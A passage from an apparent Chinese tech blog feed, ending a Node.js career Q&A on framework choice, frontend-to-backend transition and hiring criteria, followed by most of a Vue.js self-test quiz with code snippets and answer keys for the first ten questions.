框架那么多，我该怎么选？</p><p>答：初学者推荐Express，如果有一定经验，推荐Koa。当然真正项目里还是推荐Eggjs和Thinkjs这样的框架。</p><h3 id="从前端转"><a href="#从前端转" class="headerlink" title="从前端转"></a>从前端转</h3><p>从前端往后端转，api 接口非常容易学会，像 express、koa 这类框架大部分人一周就能学会，最难的是对 db、er 模型的理解，说直白点，还是业务需求落地的理解</p><p>我们来想想一般的前端有什么技能？</p><ul><li>html</li><li>css（兼容浏览器）</li><li>js 会点（可能更多的是会点 jquery）</li><li>ps 切图</li><li>firebug 和 chrome debuger 会的人都不太多</li><li>用过几个框架，大部分人是仅仅会用</li><li>英语一般</li><li>svn&#x2F;git 会一点</li></ul><p>那么他们如果想在前端领域做的更深有哪些难点呢？</p><ul><li>基础：oo，dp，命令，shell，构建等</li><li>编程思想上的理解（mvc、ioc，规约等）</li><li>区分概念</li><li>外围验收，如 H5 和 hybird 等</li><li>追赶趋势，如何学习新东西</li></ul><p>以上皆是痛点，所以比较好的办法应该是这样的。</p><ul><li>玩转 npm、gulp 这样的前端工具类（此时还是前端）</li><li>使用 node 做前后端分离（此时还是前端）</li><li>express、koa 这类框架</li><li>jade、ejs 等模板引擎</li><li>nginx</li><li>玩转【后端】异步流程处理（promise&#x2F;es6的(generator|yield)&#x2F;es7(async|await)）</li><li>玩转【后端】mongodb、mysql 对应的 Node 模块</li></ul><p>从我们的经验看，这样是比较靠谱的。先做最简单前后端分离，里面没有任何和db相关，前端可以非常容易的学会，基本2周就已经非常熟练了。一般半年后，让他们接触【异步流程处理】和【数据库】相关内容，学习后端代码，就可以全栈了。</p><p>招人标准 先说下我的招人标准，做技术总监时上指下派只要看好技术能力和态度即可，做CTO时要考虑团队文化，人品和能否在公司长留，所以不同的人面试要看的点是不一样的，我曾面过很多Node.js程序员，也见过很多面试题，汇总一下，大致有以下9个点： 1. 基本的Node.js几个特性，比如事件驱动、非阻塞I&#x2F;O、Stream等 2. 异步流程控制相关，Promise是必问的 3. 掌握1种以上Web框架，比如Express、Koa、Thinkjs、Restfy、Hapi等，会问遇到过哪些问题、以及前端优化等常识 4. 数据库相关，尤其是SQL、缓存、Mongodb等 5. 对于常见Node.js模块、工具的使用，观察一个人是否爱学习、折腾 6. 是否熟悉linux，是否独立部署过服务器，有+分 7. js语法和es6、es7，延伸CoffeeScript、TypeScript等，看看你是否关注新技术，有+分 8. 对前端是否了解，有+分 9. 是否参与过或写过开源项目，技术博客、有+分 补充一句:只看技能没人品的人，千万别招，白脸狼</p><p>能否推荐点 nodejs 相关的博客<br><a href="%5Bhttps://github.com/sindresorhus/awesome-nodejs%5D(https://github.com/sindresorhus/awesome-nodejs)">sindresorhus&#x2F;awesome-nodejs</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>有没有入门VUE，就看这份自测题了♨</title>
      <link href="/Blog/2018/11/11/vue/%E6%9C%89%E6%B2%A1%E6%9C%89%E5%85%A5%E9%97%A8VUE%EF%BC%8C%E5%B0%B1%E7%9C%8B%E8%BF%99%E4%BB%BD%E8%87%AA%E6%B5%8B%E9%A2%98%E4%BA%86%E2%99%A8/index/"/>
      <url>/Blog/2018/11/11/vue/%E6%9C%89%E6%B2%A1%E6%9C%89%E5%85%A5%E9%97%A8VUE%EF%BC%8C%E5%B0%B1%E7%9C%8B%E8%BF%99%E4%BB%BD%E8%87%AA%E6%B5%8B%E9%A2%98%E4%BA%86%E2%99%A8/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>精选的四十五道vue自测题，每五道题公布一次答案。</p></blockquote><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p>html</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">____________</span>???<span class="attr">____________</span>&gt;</span></span><br><span class="line">    鼠标悬停几秒钟查看此处动态绑定的提示信息！</span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">var</span> app = new <span class="type">Vue</span>(&#123;</span><br><span class="line">  el: &#x27;#app&#x27;,</span><br><span class="line">  <span class="class"><span class="keyword">data</span>: &#123;</span></span><br><span class="line"><span class="class">    <span class="title">message</span>: &#x27;<span class="type">Hello</span> <span class="type">Vue</span>!&#x27;</span></span><br><span class="line"><span class="class">  &#125;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="问号处应该填入什么，才能使得-span-的-title-为-message-的值？"><a href="#问号处应该填入什么，才能使得-span-的-title-为-message-的值？" class="headerlink" title="问号处应该填入什么，才能使得 span 的 title 为 message 的值？"></a>问号处应该填入什么，才能使得 span 的 title 为 message 的值？</h5><p>A: title&#x3D;”message”<br>B: :title&#x3D;”message”<br>C: bind:title&#x3D;”message”<br>D: v-bind:title&#x3D;”message”<br>E: title&#x3D;”“<br>F: :title&#x3D;message<br>G: v-bind:title&#x3D;message</p><h3 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h3><p>我们在初始化一个 Vue 应用时，需要首先创建一个 Vue 实例：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> <span class="type">Vue</span>(options)</span><br></pre></td></tr></table></figure><h5 id="其中-options-是一个对象，请问文档中说-options-可以包含哪些-key-？"><a href="#其中-options-是一个对象，请问文档中说-options-可以包含哪些-key-？" class="headerlink" title="其中 options 是一个对象，请问文档中说 options 可以包含哪些 key ？"></a>其中 options 是一个对象，请问文档中说 options 可以包含哪些 key ？</h5><p>A: data props propsData computed methods watch<br>B: el template render renderError<br>C: beforeCreate created beforeMount mounted beforeUpdate updated activated deactivated beforeDestroy destroyed errorCaptured<br>D: directives filters components parent mixins extends provide inject<br>E: name delimiters functional model inheritAttrs comments</p><h3 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h3><p>html</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">span-a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">obj.a</span>&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">span-b</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">obj.b</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> app = new <span class="built_in">Vue</span>(&#123;</span><br><span class="line">  el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    obj: &#123;</span><br><span class="line">      <span class="selector-tag">a</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">app<span class="selector-class">.obj</span><span class="selector-class">.b</span> = <span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="请问最终-span-a-和-span-b-中分别展示什么字符串？"><a href="#请问最终-span-a-和-span-b-中分别展示什么字符串？" class="headerlink" title="请问最终 span-a 和 span-b 中分别展示什么字符串？"></a>请问最终 span-a 和 span-b 中分别展示什么字符串？</h5><p>A: span-a 中显示a，span-b 中显示 b<br>B: span-a 中显示a，span-b 中显示 undefined<br>C: span-a 中显示a，span-b 中不显示</p><h3 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h3><p>html</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">span-a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">obj.a</span>&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">span-b</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">obj.b</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> app = new <span class="built_in">Vue</span>(&#123;</span><br><span class="line">  el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    obj: &#123;</span><br><span class="line">      <span class="selector-tag">a</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">app<span class="selector-class">.obj</span><span class="selector-class">.a</span> = <span class="string">&#x27;a2&#x27;</span></span><br><span class="line">app<span class="selector-class">.obj</span><span class="selector-class">.b</span> = <span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="请问最终-span-a-和-span-b-中分别展示什么字符串？-1"><a href="#请问最终-span-a-和-span-b-中分别展示什么字符串？-1" class="headerlink" title="请问最终 span-a 和 span-b 中分别展示什么字符串？"></a>请问最终 span-a 和 span-b 中分别展示什么字符串？</h5><p>A: span-a 中显示a2，span-b 中不显示<br>B: span-a 中显示a2，span-b 中显示b</p><h3 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h3><h5 id="关于-Object-freeze-正确的有"><a href="#关于-Object-freeze-正确的有" class="headerlink" title="关于 Object.freeze() 正确的有"></a>关于 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze" title="null">Object.freeze()</a> 正确的有</h5><p>A: Object.freeze() 方法可以冻结一个对象，冻结指的是不能向这个对象添加新的属性，不能修改其已有属性的值，不能删除已有属性，以及不能修改该对象已有属性的可枚举性、可配置性、可写性。<br>B: const object2 &#x3D; Object.freeze(object1); 其中 object2 和 object1 是同一个对象<br>C: 被冻结对象有一个属性也是对象，那么这个作为属性的对象也是被冻结的。</p><blockquote><p><em><strong>1.BDFG 2.ABCDE 3.C 4.B 5.AB</strong></em></p></blockquote><h3 id="六、"><a href="#六、" class="headerlink" title="六、"></a>六、</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> vm = <span class="literal">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">&#x27;#example&#x27;</span>,</span><br><span class="line">  <span class="built_in">data</span>: &#123;message: <span class="string">&#x27;hi&#x27;</span>&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="请问这个-vm-有哪些属性（API）？"><a href="#请问这个-vm-有哪些属性（API）？" class="headerlink" title="请问这个 vm 有哪些属性（API）？"></a>请问这个 vm 有哪些属性（API）？</h5><p>A: <code>$data $props $el $options $parent $root $children $slots $scopedSlots $refs $isServer $attrs $listeners</code><br>B: <code>$watch $set $delete</code><br>C: <code>$on $once $off $emit</code><br>D: <code>$mount $forceUpdate $nextTick $destroy</code></p><h3 id="七、"><a href="#七、" class="headerlink" title="七、"></a>七、</h3><h5 id="关于模板语法说法正确的是"><a href="#关于模板语法说法正确的是" class="headerlink" title="关于模板语法说法正确的是"></a>关于模板语法说法正确的是</h5><p>A: Vue.js 使用了基于 XML 的模板语法<br>B: 在底层的实现上，Vue 将模板编译成虚拟 DOM 渲染函数。<br>C: 结合响应系统，Vue 能够智能地计算出最少需要重新渲染多少组件，并把 DOM 操作次数减到最少。<br>D: 你也可以不用模板，直接写渲染 (render) 函数，使用可选的 JSX 语法。</p><h3 id="八、"><a href="#八、" class="headerlink" title="八、"></a>八、</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> v-<span class="keyword">on</span>:submit.prevent=<span class="string">&quot;onSubmit&quot;</span>&gt;...&lt;/<span class="keyword">form</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="请问-prevent-在-Vue-被称作什么（三个汉字）？"><a href="#请问-prevent-在-Vue-被称作什么（三个汉字）？" class="headerlink" title="请问 .prevent 在 Vue 被称作什么（三个汉字）？"></a>请问 .prevent 在 Vue 被称作什么（三个汉字）？</h5><h3 id="九、"><a href="#九、" class="headerlink" title="九、"></a>九、</h3><h5 id="模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让"><a href="#模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让" class="headerlink" title="模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让_______???______"></a>模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让_______???______</h5><p>请按照文档作答。<br>模板过重且难以维护</p><h5 id="所以，对于-Vue-模板中任何复杂逻辑，你都应当使用"><a href="#所以，对于-Vue-模板中任何复杂逻辑，你都应当使用" class="headerlink" title="所以，对于 Vue 模板中任何复杂逻辑，你都应当使用_______???______"></a>所以，对于 Vue 模板中任何复杂逻辑，你都应当使用_______???______</h5><p>请按照文档作答。</p><h3 id="十、"><a href="#十、" class="headerlink" title="十、"></a>十、</h3><p>html</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">computedMessage</span>&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">computedMessage</span>&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">computedMessage</span>&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">calcMessage</span>()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">calcMessage</span>()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">calcMessage</span>()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;hi&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="title function_">computedMessage</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;computed&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;computed &#x27;</span> + <span class="variable language_">this</span>.<span class="property">message</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">calcMessage</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;methods&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;calc &#x27;</span> + <span class="variable language_">this</span>.<span class="property">message</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="问，打印了几次「computed」，几次「methods」"><a href="#问，打印了几次「computed」，几次「methods」" class="headerlink" title="问，打印了几次「computed」，几次「methods」"></a>问，打印了几次「computed」，几次「methods」</h5><p>A: 三次 computed，三次 methods<br>B: 一次 computed，一次 methods<br>C: 一次 computed，三次 methods</p><blockquote><p><em><strong>6.ABC 7.BCD 8.修饰符 9.计算属性 10.C</strong></em></p></blockquote><h3 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h3><p>html</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">       </span><span class="template-variable">&#123;&#123;<span class="name">obj.count</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;obj.count+=1&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;obj.count-=1&quot;</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      你改了 </span><span class="template-variable">&#123;&#123;<span class="name">modified</span>&#125;&#125;</span><span class="language-xml"> 次</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    obj:&#123;<span class="keyword">count</span>: <span class="number">1</span>&#125;,</span><br><span class="line">    modified: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  watch:&#123;</span><br><span class="line">    _______???________</span><br><span class="line">      <span class="keyword">this</span>.modified += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="要如何写代码才能监听-obj-count-的变化？"><a href="#要如何写代码才能监听-obj-count-的变化？" class="headerlink" title="要如何写代码才能监听 obj.count 的变化？"></a>要如何写代码才能监听 obj.count 的变化？</h5><p>A: obj.count(){<br>B: obj(){<br>C: ‘obj.count’:function(){</p><h3 id="十二、"><a href="#十二、" class="headerlink" title="十二、"></a>十二、</h3><p>html</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">       </span><span class="template-variable">&#123;&#123;<span class="name">obj.a</span>&#125;&#125;</span><span class="language-xml"> </span><span class="template-variable">&#123;&#123;<span class="name">obj.b</span>&#125;&#125;</span><span class="language-xml"> </span><span class="template-variable">&#123;&#123;<span class="name">obj.c</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;obj.a+=1&quot;</span>&gt;</span>a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;obj.b+=1&quot;</span>&gt;</span>b+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;obj.c+=1&quot;</span>&gt;</span>c+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      你改了 </span><span class="template-variable">&#123;&#123;<span class="name">modified</span>&#125;&#125;</span><span class="language-xml"> 次</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">modified</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">obj</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:<span class="number">3</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">created</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">this</span>.$watch(<span class="string">&#x27;obj&#x27;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">modified</span> += <span class="number">1</span></span><br><span class="line">      &#125;, ___________????_________)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="接上题，如果-obj-有-N-个属性，要怎么才能监听所有属性呢？"><a href="#接上题，如果-obj-有-N-个属性，要怎么才能监听所有属性呢？" class="headerlink" title="接上题，如果 obj 有 N 个属性，要怎么才能监听所有属性呢？"></a>接上题，如果 obj 有 N 个属性，要怎么才能监听所有属性呢？</h5><h3 id="十三、"><a href="#十三、" class="headerlink" title="十三、"></a>十三、</h3><p>html</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;</span></span></span><span class="template-variable">&#123; color: activeColor, fontSize: fontSize &#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  activeColor: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">  fontSize: <span class="number">30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>result</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> style=<span class="string">&quot;color: red;&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="请问为什么-fontSize-没有生效？"><a href="#请问为什么-fontSize-没有生效？" class="headerlink" title="请问为什么 fontSize 没有生效？"></a>请问为什么 fontSize 没有生效？</h5><h3 id="十四、"><a href="#十四、" class="headerlink" title="十四、"></a>十四、</h3><h6 id="Vue-会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。这么做除了使-Vue-变得非常快之外，还有其它一些好处。"><a href="#Vue-会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。这么做除了使-Vue-变得非常快之外，还有其它一些好处。" class="headerlink" title="Vue 会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。这么做除了使 Vue 变得非常快之外，还有其它一些好处。"></a>Vue 会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。这么做除了使 Vue 变得非常快之外，还有其它一些好处。</h6><h5 